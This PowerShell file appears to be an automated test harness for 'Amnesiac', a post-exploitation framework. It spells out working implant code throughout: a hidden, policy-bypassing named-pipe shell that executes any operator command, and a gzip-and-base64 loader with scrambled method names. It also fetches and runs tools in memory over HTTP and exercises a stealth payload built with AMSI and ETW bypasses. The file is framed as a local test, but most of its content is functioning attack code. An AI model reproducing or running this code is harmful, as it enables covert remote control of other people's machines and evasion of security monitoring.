
# LocalScenario2Test.ps1
# Full automated Scenario 2 test: in-memory load -> pipe session -> tool delivery

Set-Location 'C:\users\localuser\Downloads\Amnesiac-main\Amnesiac-main'
. .\Amnesiac.ps1

# Globals are initialized inside function Amnesiac{} - set them here manually
$global:EndMarker  = -join ((65..90 + 97..122) | Get-Random -Count 8  | % {[char]$_})
$global:BufferSize = @(512, 1024, 2048, 4096) | Get-Random
$global:PayloadConfig = @{
    Amsi        = 'pageguard'
    Etw         = 'provider'
    Sbl         = $true
    Launcher    = 'ps'
    Jitter      = $false
    JitterMin   = 1
    JitterMax   = 3
    Encoding    = 'none'
    Obfuscation = $false
    EnvKeys     = @{}
}
$global:payloadformat = 'b64'

$PASS = 0; $FAIL = 0
function Pass($m) { Write-Output "  [PASS] $m"; $script:PASS++ }
function Fail($m) { Write-Output "  [FAIL] $m"; $script:FAIL++ }

Write-Output ""
Write-Output "============================================================"
Write-Output " AMNESIAC SCENARIO 2 LOCAL TEST"
Write-Output " EndMarker : $global:EndMarker"
Write-Output " BufferSize: $global:BufferSize"
Write-Output "============================================================"

# ── File server ──────────────────────────────────────────────────────────────
if (-not (Get-NetTCPConnection -LocalPort 8080 -ErrorAction SilentlyContinue)) {
    $root = 'C:\users\localuser\Downloads\Amnesiac-main\Amnesiac-main'
    $fc   = $FileServerScript + "`nFile-Server -Port 8080 -Path '$root'"
    $fenc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($fc))
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$fenc
    Start-Sleep 2
}
Write-Output " File server : $(if (Get-NetTCPConnection -LocalPort 8080 -EA 0) { 'RUNNING' } else { 'DOWN' })"
Write-Output " Operator    : $([System.Net.Dns]::GetHostByName($env:computerName).HostName)"
Write-Output ""

# ── Helpers ───────────────────────────────────────────────────────────────────
function New-Server([string]$n) {
    $sd = New-Object System.IO.Pipes.PipeSecurity
    $sd.AddAccessRule((New-Object System.IO.Pipes.PipeAccessRule(
        (New-Object System.Security.Principal.SecurityIdentifier 'S-1-1-0'),
        'FullControl', 'Allow')))
    New-Object System.IO.Pipes.NamedPipeServerStream(
        $n, 'InOut', 1, 'Byte', 'None',
        $global:BufferSize, $global:BufferSize, $sd)
}

function Send-Cmd($w, $r, [string]$cmd) {
    $w.WriteLine($cmd); $w.Flush()
    $sb = [System.Text.StringBuilder]::new()
    while ($true) {
        $line = $r.ReadLine()
        if ($null -eq $line -or $line -eq $global:EndMarker) { break }
        [void]$sb.AppendLine($line)
    }
    $sb.ToString().Trim()
}

function Run-SessionTest {
    param([string]$Label, [System.IO.Pipes.NamedPipeServerStream]$Pipe, [int]$TimeoutMs = 20000)

    Write-Output "--- ${Label} ---"

    if (-not $Pipe.WaitForConnectionAsync().Wait($TimeoutMs)) {
        Fail "${Label} connection timeout after $($TimeoutMs/1000)s"
        $Pipe.Dispose(); return
    }

    $r = New-Object System.IO.StreamReader($Pipe)
    $w = New-Object System.IO.StreamWriter($Pipe)

    try {
        $hs = $r.ReadLine()
        Write-Output "  Handshake : $hs"
        if ($hs -match '\w') { Pass "${Label} handshake received" }
        else { Fail "${Label} handshake empty" }

        # whoami
        $out = Send-Cmd $w $r 'whoami'
        Write-Output "  whoami    : $out"
        if ($out) { Pass "${Label} whoami OK" } else { Fail "${Label} whoami empty" }

        # 64-bit check
        $out = Send-Cmd $w $r '[System.Environment]::Is64BitProcess'
        Write-Output "  64-bit    : $out"
        if ($out -match 'True|False') { Pass "${Label} Is64BitProcess OK" }
        else { Fail "${Label} Is64BitProcess unexpected: $out" }

        # Tool delivery via HTTP
        $out = Send-Cmd $w $r '(New-Object Net.WebClient).DownloadString("http://localhost:8080/Tools/SimpleAMSI.ps1").Length'
        Write-Output "  Tool len  : $out bytes"
        if ([int]$out.Trim() -gt 100) { Pass "${Label} tool delivery OK ($out bytes)" }
        else { Fail "${Label} tool delivery failed (got: $out)" }

        # iex tool in-memory — single statement avoids 2>&1 appended after compound if-else
        $out = Send-Cmd $w $r "iex (New-Object Net.WebClient).DownloadString('http://localhost:8080/Tools/SimpleAMSI.ps1'); Write-Output 'iex-ok'"
        Write-Output "  Tool iex  : $out"
        if ($out -match 'iex-ok') { Pass "${Label} tool iex in-memory OK" }
        else { Fail "${Label} tool iex failed: $out" }

    } catch {
        Fail "${Label} exception: $_"
    } finally {
        try { $w.WriteLine('exit'); $w.Flush() } catch {}
        Start-Sleep -Milliseconds 400
        try { $Pipe.Disconnect() } catch {}
        $Pipe.Dispose()
    }
    Write-Output ""
}

function Start-Payload([string]$script) {
    $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc
}

# NOTE: Client uses "." as server name for local pipe access (avoids SMB path)
# In real Scenario 2, client uses the operator's FQDN across the network.

# ════════════════════════════════════════════════════════════════════
# TEST 1 — b64 payload
# ════════════════════════════════════════════════════════════════════
$PipeName = -join ((65..90)+(97..122) | Get-Random -Count 16 | % {[char]$_})
$EM       = $global:EndMarker

$ClientScript = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream('.','$PipeName','InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(15000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq 'exit'){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split '`n'|%{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split '`r?`n'|%{`$w.WriteLine(`$_)}};`$w.WriteLine('$EM');`$w.Flush()};`$p.Close();`$p.Dispose();exit"

Write-Output "TEST 1  pipe   : $PipeName"
$srv1 = New-Server $PipeName
Start-Payload $ClientScript
Run-SessionTest -Label "TEST 1 (b64)" -Pipe $srv1

# ════════════════════════════════════════════════════════════════════
# TEST 2 — gzip payload
# ════════════════════════════════════════════════════════════════════
$PipeName = -join ((65..90)+(97..122) | Get-Random -Count 16 | % {[char]$_})
$EM       = $global:EndMarker

$RawCS = "`$p=New-Object System.IO.Pipes.NamedPipeClientStream('.',""$PipeName"",'InOut');`$r=New-Object System.IO.StreamReader(`$p);`$w=New-Object System.IO.StreamWriter(`$p);`$p.Connect(15000);`$w.WriteLine(""`$([System.Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)"");`$w.Flush();while(`$true){`$c=`$r.ReadLine();if(`$c-eq ""exit""){break};try{`$result=iex ""`$c 2>&1 | Out-String"";`$result-split ""`u{000A}""|ForEach-Object{`$w.WriteLine(`$_.TrimEnd())}}catch{`$_.Exception.Message-split ""`u{000D}`u{000A}""|ForEach-Object{`$w.WriteLine(`$_)}};`$w.WriteLine(""$EM"");`$w.Flush()};`$p.Close();`$p.Dispose();exit"

$ms  = [System.IO.MemoryStream]::new()
$gz  = [System.IO.Compression.GzipStream]::new($ms,[System.IO.Compression.CompressionMode]::Compress)
$gz.Write([System.Text.Encoding]::UTF8.GetBytes($RawCS),0,[System.Text.Encoding]::UTF8.GetBytes($RawCS).Length)
$gz.Close()
$b64gz = [Convert]::ToBase64String($ms.ToArray())
$gzPayload = "`$gz='$b64gz';`$a=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$gz));`$b=New-Object IO.Compression.GzipStream(`$a,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$c=New-Object System.IO.MemoryStream;`$b.COpYTo(`$c);`$d=[System.Text.Encoding]::UTF8.GETSTrIng(`$c.ToArray());`$b.ClOse();`$a.ClosE();`$c.cLose();`$d|IEX"

Write-Output "TEST 2  pipe   : $PipeName"
Write-Output "TEST 2  gzip sz: $($gzPayload.Length) chars"
$srv2 = New-Server $PipeName
Start-Payload $gzPayload
Run-SessionTest -Label "TEST 2 (gzip)" -Pipe $srv2

# ════════════════════════════════════════════════════════════════════
# TEST 3 — stealth payload (New-PayloadScript: AMSI+ETW bypasses)
# ════════════════════════════════════════════════════════════════════
$PipeName    = -join ((65..90)+(97..122) | Get-Random -Count 16 | % {[char]$_})
$ComputerName = '.'   # local pipe for local test

Write-Output "TEST 3  pipe   : $PipeName"
try {
    $built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
    Write-Output "TEST 3  stealth: $($built.InlinePS.Length) chars"
    $srv3 = New-Server $PipeName
    Start-Payload ($built.InlinePS + ';exit')
    Run-SessionTest -Label "TEST 3 (stealth/bypasses)" -Pipe $srv3 -TimeoutMs 40000
} catch {
    Fail "TEST 3 New-PayloadScript threw: $_"
    Write-Output ""
}

# ════════════════════════════════════════════════════════════════════
Write-Output "============================================================"
Write-Output " RESULTS: $PASS passed, $FAIL failed"
Write-Output "============================================================"
if ($FAIL -eq 0) { exit 0 } else { exit 1 }
